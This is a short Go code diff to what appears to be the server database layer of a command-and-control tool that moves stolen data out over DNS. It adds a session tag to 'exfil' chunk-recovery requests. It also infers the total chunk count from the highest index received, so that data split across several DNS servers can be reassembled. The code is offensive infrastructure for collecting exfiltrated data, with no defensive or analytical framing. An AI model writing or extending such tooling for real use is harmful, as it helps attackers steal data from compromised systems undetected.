@@ -288,6 +288,7 @@ func (d *MasterDatabase) getPendingCompletion(taskID string) (string, int, bool)
 type MissingChunkRequest struct {
 	Type         string `json:"type"`          // "task" or "exfil"
 	ID           string `json:"id"`            // task_id or session_id
+	Tag          string `json:"tag,omitempty"` // exfil session tag for distributed lookup
 	TotalChunks  int    `json:"total_chunks"`
 	MissingChunks []int `json:"missing_chunks"`
 }
@@ -352,9 +353,14 @@ func (d *MasterDatabase) GetPendingMissingChunks(maxAge time.Duration) ([]Missin
 		// Get which chunks we have for this exfil session
 		missingChunks := d.getMissingExfilChunks(sessionID, totalChunks)
 		if len(missingChunks) > 0 {
+			// Look up the tag for this session for distributed chunk recovery
+			var tag string
+			d.db.QueryRow(`SELECT tag FROM exfil_session_tags WHERE session_id = ?`, sessionID).Scan(&tag)
+			
 			requests = append(requests, MissingChunkRequest{
 				Type:          "exfil",
 				ID:            sessionID,
+				Tag:           tag,
 				TotalChunks:   totalChunks,
 				MissingChunks: missingChunks,
 			})
@@ -410,11 +416,21 @@ func (d *MasterDatabase) getMissingExfilChunks(sessionID string, totalChunks int
 	defer rows.Close()
 
 	haveChunks := make(map[int]bool)
+	maxIdx := 0
 	for rows.Next() {
 		var idx int
 		if err := rows.Scan(&idx); err == nil {
 			haveChunks[idx] = true
+			if idx > maxIdx {
+				maxIdx = idx
+			}
 		}
+	}
+
+	// If totalChunks is 0 but we have a completion signal, infer from max chunk index
+	// This handles distributed exfil where metadata went to one DNS server and completion to another
+	if totalChunks == 0 && maxIdx > 0 {
+		totalChunks = maxIdx
 	}
 
 	// Find missing chunks (1-indexed)
